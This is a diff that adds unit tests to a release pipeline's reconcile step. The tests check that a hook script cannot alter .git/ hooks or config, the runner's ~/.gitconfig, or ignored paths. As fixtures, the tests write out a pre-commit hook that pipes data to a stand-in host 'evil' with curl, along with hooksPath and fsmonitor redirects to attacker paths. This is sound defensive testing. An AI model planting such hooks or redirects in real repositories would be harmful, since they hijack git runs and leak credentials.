@@ -386,5 +386,119 @@ class ReconcileTest(unittest.TestCase):
         self.assertEqual("unset unset unset unset\n", probe.read_text(encoding="utf-8"))
 
 
+class GitControlSurfaceTest(unittest.TestCase):
+    """`git status` never reports `.git/` itself, so it is checked directly.
+
+    Everything under `.git/` decides what code later `git` invocations run — and
+    the next steps run `git commit` and the pinned changelog engine *with* the
+    release App token. A hook that writes there has a credential-exfiltration
+    path that no worktree diff can see.
+    """
+
+    def setUp(self):
+        import contextlib
+        self.stack = contextlib.ExitStack()
+        self.addCleanup(self.stack.close)
+        self.fixture = Fixture(self.stack)
+
+    def test_rejects_a_hook_that_installs_a_git_hook(self):
+        self.fixture.write_hook(
+            "#!/usr/bin/env bash\n"
+            'printf "tag\\n" > Dockerfile\n'
+            'printf "#!/bin/sh\\ncurl -d @- evil\\n" > .git/hooks/pre-commit\n'
+            "chmod +x .git/hooks/pre-commit\n"
+        )
+        result = self.fixture.run()
+        self.assertEqual(1, result.returncode, result.stdout)
+        self.assertIn("Git control surface", result.stderr)
+
+    def test_rejects_a_hook_that_rewrites_git_config(self):
+        self.fixture.write_hook(
+            "#!/usr/bin/env bash\n"
+            'printf "tag\\n" > Dockerfile\n'
+            "git config core.hooksPath /tmp/attacker-hooks\n"
+        )
+        result = self.fixture.run()
+        self.assertEqual(1, result.returncode, result.stdout)
+        self.assertIn("Git control surface", result.stderr)
+
+    def test_rejects_a_hook_that_rewrites_the_repository_exclude_file(self):
+        self.fixture.write_hook(
+            "#!/usr/bin/env bash\n"
+            'printf "tag\\n" > Dockerfile\n'
+            'printf "smuggled.txt\\n" >> .git/info/exclude\n'
+            'printf "payload\\n" > smuggled.txt\n'
+        )
+        result = self.fixture.run()
+        self.assertEqual(1, result.returncode, result.stdout)
+        self.assertIn("Git control surface", result.stderr)
+
+    def test_rejects_a_hook_that_tampers_with_the_pinned_checkouts_git_dir(self):
+        self.fixture.write_hook(
+            "#!/usr/bin/env bash\n"
+            'printf "tag\\n" > Dockerfile\n'
+            "git -C .container-release-contract config core.fsmonitor /tmp/liar\n"
+        )
+        result = self.fixture.run()
+        self.assertEqual(1, result.returncode, result.stdout)
+        self.assertIn("Git control surface", result.stderr)
+
+    def test_hook_cannot_reach_the_runner_home_directory(self):
+        """A writable `$HOME` is a `~/.gitconfig` away from the same escalation."""
+        self.fixture.write_hook(
+            "#!/usr/bin/env bash\n"
+            'printf "tag\\n" > Dockerfile\n'
+            'printf "%s\\n" "$HOME" > /tmp/reconcile-home-probe\n'
+            'printf "[core]\\n\\thooksPath = /tmp/attacker\\n" > "$HOME/.gitconfig"\n'
+        )
+        probe = pathlib.Path("/tmp/reconcile-home-probe")
+        probe.unlink(missing_ok=True)
+        self.addCleanup(probe.unlink, True)
+        real_home = pathlib.Path(os.environ["HOME"]) / ".gitconfig"
+        before = real_home.read_bytes() if real_home.is_file() else None
+        result = self.fixture.run()
+        self.assertEqual(0, result.returncode, result.stderr)
+        self.assertNotEqual(os.environ["HOME"], probe.read_text(encoding="utf-8").strip())
+        self.assertEqual(before, real_home.read_bytes() if real_home.is_file() else None)
+        self.assertFalse(pathlib.Path(probe.read_text(encoding="utf-8").strip()).exists())
+
+    def test_rejects_a_hook_that_hides_output_in_an_ignored_path(self):
+        (self.fixture.repo / ".gitignore").write_text("build/\n", encoding="utf-8")
+        git(self.fixture.repo, "add", "--", ".gitignore")
+        git(self.fixture.repo, "commit", "-qm", "ignore build")
+        self.fixture.write_hook(
+            "#!/usr/bin/env bash\n"
+            'printf "tag\\n" > Dockerfile\n'
+            "mkdir -p build\n"
+            'printf "payload\\n" > build/smuggled.txt\n'
+        )
+        result = self.fixture.run()
+        self.assertEqual(1, result.returncode, result.stdout)
+        self.assertIn("ignored output", result.stderr)
+
+
+class AllowlistShapeTest(unittest.TestCase):
+    def setUp(self):
+        import contextlib
+        self.stack = contextlib.ExitStack()
+        self.addCleanup(self.stack.close)
+        self.fixture = Fixture(self.stack)
+
+    def test_rejects_an_allowlist_entry_that_names_a_directory(self):
+        """`ls-files -- deploy` lists the files *under* it; the entry itself is not one."""
+        result = self.fixture.run(allowlist=["deploy"])
+        self.assertEqual(1, result.returncode, result.stdout)
+        self.assertIn("not a reviewed tracked file", result.stderr)
+
+    def test_rejects_a_tracked_staged_list_path(self):
+        """A committed `reconciled-paths.txt` would be rewritten behind the reviewers."""
+        (self.fixture.repo / "reconciled-paths.txt").write_text("Dockerfile\n", encoding="utf-8")
+        git(self.fixture.repo, "add", "--", "reconciled-paths.txt")
+        git(self.fixture.repo, "commit", "-qm", "staged list")
+        result = self.fixture.run()
+        self.assertEqual(1, result.returncode, result.stdout)
+        self.assertIn("reconciled-paths.txt", result.stderr)
+
+
 if __name__ == "__main__":
     unittest.main()
